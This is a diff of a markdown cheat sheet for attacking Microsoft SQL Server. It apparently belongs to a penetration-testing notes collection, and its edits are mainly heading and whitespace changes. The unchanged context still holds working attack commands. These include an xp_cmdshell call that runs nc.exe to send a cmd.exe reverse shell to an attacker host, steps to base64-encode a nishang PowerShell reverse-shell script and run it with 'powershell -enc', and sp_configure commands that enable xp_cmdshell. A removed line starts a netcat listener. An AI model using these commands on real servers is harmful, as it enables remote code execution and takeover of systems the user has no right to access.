@@ -70,8 +70,9 @@ EXECUTE('EXEC xp_cmdshell ''C:\Windows\Temp\nc.exe -e cmd.exe $attacker 9001''')
 ```
 
 ## [+] Powershell Execution
-
 > Raw code creation:- Use the nishang (tcponelinear.ps1).
+
+
 ```bash
 cat file_name |iconv -t utf-16le | base64 -w0;echo
 ```
@@ -81,7 +82,8 @@ cat file_name |iconv -t utf-16le | base64 -w0;echo
  EXEC ('EXEC xp_cmdshell  "powershell -enc <encoded_raw_code>";')
  ```
 
-### [+]  Enable the xp_cmdshell
+## [+]  Enable the xp_cmdshell
+
 ```bash
 +  EXEC sp_configure 'show advanced options', 1;         
 +  RECONFIGURE;                                          
@@ -91,7 +93,5 @@ cat file_name |iconv -t utf-16le | base64 -w0;echo
 +  exec xp_cmdshell 'whoami'                             
 +  exec xp_cmdshell 'powershell -enc <encoded_raw_code>' 
 ```
-+  sudo nc -lvnp 9001                                    +
-++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
 
